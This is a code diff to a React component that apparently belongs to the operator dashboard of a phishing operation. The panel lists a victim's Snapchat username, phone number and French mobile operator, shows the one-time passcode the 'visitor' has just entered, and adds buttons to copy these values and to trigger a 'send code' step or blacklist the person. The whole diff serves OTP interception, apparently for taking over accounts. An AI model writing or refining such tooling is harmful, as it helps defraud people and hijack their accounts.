@@ -1,21 +1,60 @@
+import { useState } from "react";
 import { motion } from "framer-motion";
-import { Ban } from "lucide-react";
+import { Ban, Copy, Check } from "lucide-react";
 
 const opColor = {
-  SFR: { badge: "bg-red-500/10 text-red-400 border-red-500/25", btn: "bg-red-500 hover:bg-red-600 text-white", text: "text-red-400" },
-  Bouygues: { badge: "bg-blue-500/10 text-blue-400 border-blue-500/25", btn: "bg-blue-500 hover:bg-blue-600 text-white", text: "text-blue-400" },
-  Orange: { badge: "bg-orange-500/10 text-orange-400 border-orange-500/25", btn: "bg-orange-500 hover:bg-orange-600 text-white", text: "text-orange-400" },
+  SFR: { badge: "bg-red-500/10 text-red-400 border-red-500/25", btn: "bg-red-500 hover:bg-red-600 text-white", tint: "bg-red-500/10" },
+  Bouygues: { badge: "bg-blue-500/10 text-blue-400 border-blue-500/25", btn: "bg-blue-500 hover:bg-blue-600 text-white", tint: "bg-blue-500/10" },
+  Orange: { badge: "bg-orange-500/10 text-orange-400 border-orange-500/25", btn: "bg-orange-500 hover:bg-orange-600 text-white", tint: "bg-orange-500/10" },
 };
-const fallback = { badge: "bg-secondary/40 text-muted-foreground border-border", btn: "bg-primary hover:bg-primary/90 text-primary-foreground", text: "text-primary" };
+const fallback = { badge: "bg-secondary/40 text-muted-foreground border-border", btn: "bg-primary hover:bg-primary/90 text-primary-foreground", tint: "bg-secondary/40" };
 
 const formatPhone = (tel) => {
   const t = String(tel || "").replace(/\D/g, "");
   return t.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
 };
 
+function FieldRow({ label, value, copyValue, tint }) {
+  const [copied, setCopied] = useState(false);
+  const copy = async () => {
+    try {
+      await navigator.clipboard.writeText(String(copyValue ?? value ?? ""));
+      setCopied(true);
+      setTimeout(() => setCopied(false), 1500);
+    } catch {}
+  };
+  return (
+    <div className={`rounded-xl px-3.5 py-2.5 ${tint || "bg-secondary/30"}`}>
+      <div className="flex items-center justify-between gap-2">
+        <div className="min-w-0">
+          <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">{label}</p>
+          <p className="text-sm font-semibold text-foreground mt-0.5 truncate font-mono">{value || "—"}</p>
+        </div>
+        {copyValue !== undefined && (
+          <button
+            onClick={copy}
+            className="shrink-0 text-[11px] font-medium px-2.5 py-1 rounded-md bg-secondary/60 border border-border text-muted-foreground hover:text-foreground transition-colors flex items-center gap-1"
+          >
+            {copied ? (
+              <>
+                <Check className="w-3 h-3" /> Copied
+              </>
+            ) : (
+              <>
+                <Copy className="w-3 h-3" /> Copy
+              </>
+            )}
+          </button>
+        )}
+      </div>
+    </div>
+  );
+}
+
 export default function ClaimedActions({ submission, onAction, onBlacklist, busyKey }) {
   const sub = submission;
   const c = opColor[sub.operateur] || fallback;
+  const hasCode = !!sub.received_code;
 
   const actions = [
     { id: "code_ready", label: "Send code (4)", cls: c.btn },
@@ -33,36 +72,50 @@ export default function ClaimedActions({ submission, onAction, onBlacklist, busy
       animate={{ opacity: 1, y: 0 }}
       className="bg-card border border-border rounded-2xl p-6 flex flex-col min-h-[60vh]"
     >
-      <div className="flex items-center justify-between mb-4">
-        <div>
-          <span className={`text-[10px] font-bold uppercase tracking-wider ${c.text}`}>Managing request</span>
-          <h2 className="text-lg font-bold text-foreground">{sub.snapchat}</h2>
-        </div>
-        <span className="text-[11px] text-muted-foreground font-mono">#{sub.id.slice(-6)}</span>
+      <div className="flex items-center gap-2 mb-5">
+        <span
+          className={`text-[11px] font-semibold px-2.5 py-1 rounded-full border ${
+            hasCode ? "border-primary/30 bg-primary/10 text-primary" : "border-border bg-secondary/40 text-muted-foreground"
+          }`}
+        >
+          {hasCode ? "OTP submitted" : "Awaiting OTP"}
+        </span>
+        <span className={`text-[11px] font-semibold px-2.5 py-1 rounded-full border ${c.badge}`}>{sub.operateur}</span>
+        <span className="ml-auto text-[11px] text-muted-foreground font-mono">#{sub.id.slice(-6)}</span>
       </div>
 
-      <div className="flex items-center gap-2 mb-1">
-        <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${c.badge}`}>{sub.operateur}</span>
-      </div>
-      <p className="text-2xl font-bold text-foreground font-mono tracking-tight mb-5">{formatPhone(sub.telephone)}</p>
+      <div className="flex flex-col gap-2.5">
+        <FieldRow label="Snapchat user" value={sub.snapchat ? `@${sub.snapchat}` : "—"} copyValue={sub.snapchat ? `@${sub.snapchat}` : ""} />
+        <FieldRow
+          label="Phone number"
+          value={formatPhone(sub.telephone)}
+          copyValue={String(sub.telephone || "").replace(/\D/g, "")}
+          tint="bg-green-500/10"
+        />
+        <FieldRow label="Operator" value={sub.operateur} tint={c.tint} />
 
-      {sub.received_code ? (
-        <div className="rounded-xl border border-primary/30 bg-primary/10 px-4 py-3">
-          <div className="flex items-center justify-between">
-            <span className="text-[10px] font-bold uppercase tracking-wider text-primary">Code reçu</span>
+        {hasCode ? (
+          <div className="rounded-xl px-3.5 py-2.5 bg-purple-500/10">
+            <div className="flex items-center justify-between gap-2">
+              <div className="min-w-0">
+                <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">OTP code</p>
+                <p className="text-2xl font-bold text-foreground mt-0.5 font-mono tracking-[0.3em]">{sub.received_code}</p>
+              </div>
+              <CopyBtn value={sub.received_code} />
+            </div>
             {sub.code_received_at && (
-              <span className="text-[10px] text-muted-foreground">
+              <p className="text-[10px] text-muted-foreground mt-1.5">
+                Received at{" "}
                 {new Date(sub.code_received_at).toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" })}
-              </span>
+              </p>
             )}
           </div>
-          <p className="mt-1 text-2xl font-bold text-foreground font-mono tracking-[0.3em]">{sub.received_code}</p>
-        </div>
-      ) : (
-        <div className="rounded-xl border border-dashed border-border px-4 py-3">
-          <span className="text-[11px] text-muted-foreground">En attente du code de l'utilisateur…</span>
-        </div>
-      )}
+        ) : (
+          <div className="rounded-xl px-3.5 py-3 bg-purple-500/5 border border-dashed border-purple-500/20">
+            <span className="text-[11px] text-purple-300/80">Waiting for the visitor to enter the OTP.</span>
+          </div>
+        )}
+      </div>
 
       <div className="grid grid-cols-2 gap-2.5 mt-6">
         {actions.map((a) => (
@@ -74,7 +127,9 @@ export default function ClaimedActions({ submission, onAction, onBlacklist, busy
           >
             {busyKey === a.id ? (
               <span className="w-3.5 h-3.5 border-2 border-current/30 border-t-current rounded-full animate-spin" />
-            ) : a.label}
+            ) : (
+              a.label
+            )}
           </button>
         ))}
         <button
@@ -86,5 +141,32 @@ export default function ClaimedActions({ submission, onAction, onBlacklist, busy
         </button>
       </div>
     </motion.div>
+  );
+}
+
+function CopyBtn({ value }) {
+  const [copied, setCopied] = useState(false);
+  const copy = async () => {
+    try {
+      await navigator.clipboard.writeText(String(value ?? ""));
+      setCopied(true);
+      setTimeout(() => setCopied(false), 1500);
+    } catch {}
+  };
+  return (
+    <button
+      onClick={copy}
+      className="shrink-0 text-[11px] font-medium px-2.5 py-1 rounded-md bg-secondary/60 border border-border text-muted-foreground hover:text-foreground transition-colors flex items-center gap-1"
+    >
+      {copied ? (
+        <>
+          <Check className="w-3 h-3" /> Copied
+        </>
+      ) : (
+        <>
+          <Copy className="w-3 h-3" /> Copy
+        </>
+      )}
+    </button>
   );
 }
